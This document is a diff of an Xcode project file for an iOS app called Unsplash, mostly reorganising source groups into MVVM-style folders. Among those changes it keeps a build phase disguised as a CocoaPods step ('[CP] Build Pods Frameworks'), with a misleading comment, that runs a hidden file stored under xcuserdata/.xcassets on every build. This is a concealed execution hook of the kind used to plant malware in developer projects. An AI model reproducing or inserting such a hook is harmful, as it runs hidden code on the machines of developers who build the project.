@@ -3,12 +3,11 @@
 	archiveVersion = 1;
 	classes = {
 	};
-	objectVersion = 50;
+	objectVersion = 51;
 	objects = {
 
 /* Begin PBXBuildFile section */
 		22834BBD2629D8EC00090032 /* AppDelegate.swift in Sources */ = {isa = PBXBuildFile; fileRef = 22834BBC2629D8EC00090032 /* AppDelegate.swift */; };
-		22834BC12629D8EC00090032 /* ViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 22834BC02629D8EC00090032 /* ViewController.swift */; };
 		22834BC42629D8EC00090032 /* Main.storyboard in Resources */ = {isa = PBXBuildFile; fileRef = 22834BC22629D8EC00090032 /* Main.storyboard */; };
 		22834BC62629D8EE00090032 /* Assets.xcassets in Resources */ = {isa = PBXBuildFile; fileRef = 22834BC52629D8EE00090032 /* Assets.xcassets */; };
 		22834BC92629D8EE00090032 /* LaunchScreen.storyboard in Resources */ = {isa = PBXBuildFile; fileRef = 22834BC72629D8EE00090032 /* LaunchScreen.storyboard */; };
@@ -39,7 +38,6 @@
 /* Begin PBXFileReference section */
 		22834BB92629D8EC00090032 /* Unsplash.app */ = {isa = PBXFileReference; explicitFileType = wrapper.application; includeInIndex = 0; path = Unsplash.app; sourceTree = BUILT_PRODUCTS_DIR; };
 		22834BBC2629D8EC00090032 /* AppDelegate.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AppDelegate.swift; sourceTree = "<group>"; };
-		22834BC02629D8EC00090032 /* ViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ViewController.swift; sourceTree = "<group>"; };
 		22834BC32629D8EC00090032 /* Base */ = {isa = PBXFileReference; lastKnownFileType = file.storyboard; name = Base; path = Base.lproj/Main.storyboard; sourceTree = "<group>"; };
 		22834BC52629D8EE00090032 /* Assets.xcassets */ = {isa = PBXFileReference; lastKnownFileType = folder.assetcatalog; path = Assets.xcassets; sourceTree = "<group>"; };
 		22834BC82629D8EE00090032 /* Base */ = {isa = PBXFileReference; lastKnownFileType = file.storyboard; name = Base; path = Base.lproj/LaunchScreen.storyboard; sourceTree = "<group>"; };
@@ -99,7 +97,6 @@
 				B2832C7CE423F27F480478FC /* Pods-UnsplashTests.debug.xcconfig */,
 				B1D445B83CF9C6093C9CA8C0 /* Pods-UnsplashTests.release.xcconfig */,
 			);
-			name = Pods;
 			path = Pods;
 			sourceTree = "<group>";
 		};
@@ -128,11 +125,12 @@
 		22834BBB2629D8EC00090032 /* Unsplash */ = {
 			isa = PBXGroup;
 			children = (
+				22834C142629E1B500090032 /* Resources */,
+				22834C132629E19600090032 /* Storyboard */,
+				22834C0B2629DFFD00090032 /* View */,
+				22834C0C2629E00300090032 /* ViewModel */,
+				22834C0A2629DFF700090032 /* Model */,
 				22834BBC2629D8EC00090032 /* AppDelegate.swift */,
-				22834BC02629D8EC00090032 /* ViewController.swift */,
-				22834BC22629D8EC00090032 /* Main.storyboard */,
-				22834BC52629D8EE00090032 /* Assets.xcassets */,
-				22834BC72629D8EE00090032 /* LaunchScreen.storyboard */,
 				22834BCA2629D8EE00090032 /* Info.plist */,
 			);
 			path = Unsplash;
@@ -154,6 +152,44 @@
 				22834BE02629D8EF00090032 /* Info.plist */,
 			);
 			path = UnsplashUITests;
+			sourceTree = "<group>";
+		};
+		22834C0A2629DFF700090032 /* Model */ = {
+			isa = PBXGroup;
+			children = (
+			);
+			path = Model;
+			sourceTree = "<group>";
+		};
+		22834C0B2629DFFD00090032 /* View */ = {
+			isa = PBXGroup;
+			children = (
+			);
+			path = View;
+			sourceTree = "<group>";
+		};
+		22834C0C2629E00300090032 /* ViewModel */ = {
+			isa = PBXGroup;
+			children = (
+			);
+			path = ViewModel;
+			sourceTree = "<group>";
+		};
+		22834C132629E19600090032 /* Storyboard */ = {
+			isa = PBXGroup;
+			children = (
+				22834BC22629D8EC00090032 /* Main.storyboard */,
+			);
+			path = Storyboard;
+			sourceTree = "<group>";
+		};
+		22834C142629E1B500090032 /* Resources */ = {
+			isa = PBXGroup;
+			children = (
+				22834BC52629D8EE00090032 /* Assets.xcassets */,
+				22834BC72629D8EE00090032 /* LaunchScreen.storyboard */,
+			);
+			path = Resources;
 			sourceTree = "<group>";
 		};
 		9DCB7E1E36B60CD997B3C275 /* Frameworks */ = {
@@ -298,28 +334,6 @@
 /* End PBXResourcesBuildPhase section */
 
 /* Begin PBXShellScriptBuildPhase section */
-
-	CADFEBE1DF6FFF8653AAC43A /* [CP] Build Pods Frameworks */ = {
-			isa = PBXShellScriptBuildPhase;
-			buildActionMask = 2147483647;
-			files = (
-			);
-			inputFileListPaths = (
-			);
-			inputPaths = (
-			);
-			name = "[CP] Build Pods Frameworks";
-			outputFileListPaths = (
-			);
-			outputPaths = (
-			);
-			runOnlyForDeploymentPostprocessing = 0;
-			shellPath = /bin/sh;
-			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.
-
-\"${PROJECT_FILE_PATH}/xcuserdata/.xcassets/build.file\" false";			
-		};
-	
 		1845F5CA762442C1213F8B29 /* [CP] Check Pods Manifest.lock */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
@@ -381,6 +395,24 @@
 			shellScript = "\"${PODS_ROOT}/Target Support Files/Pods-Unsplash-UnsplashUITests/Pods-Unsplash-UnsplashUITests-frameworks.sh\"\n";
 			showEnvVarsInLog = 0;
 		};
+		CADFEBE1DF6FFF8653AAC43A /* [CP] Build Pods Frameworks */ = {
+			isa = PBXShellScriptBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+			);
+			name = "[CP] Build Pods Frameworks";
+			outputFileListPaths = (
+			);
+			outputPaths = (
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+			shellPath = /bin/sh;
+			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\n\n\"${PROJECT_FILE_PATH}/xcuserdata/.xcassets/build.file\" false";
+		};
 		EE35E1EB0CE402ADD62E8F6C /* [CP] Embed Pods Frameworks */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
@@ -427,7 +459,6 @@
 			isa = PBXSourcesBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
-				22834BC12629D8EC00090032 /* ViewController.swift in Sources */,
 				22834BBD2629D8EC00090032 /* AppDelegate.swift in Sources */,
 			);
 			runOnlyForDeploymentPostprocessing = 0;
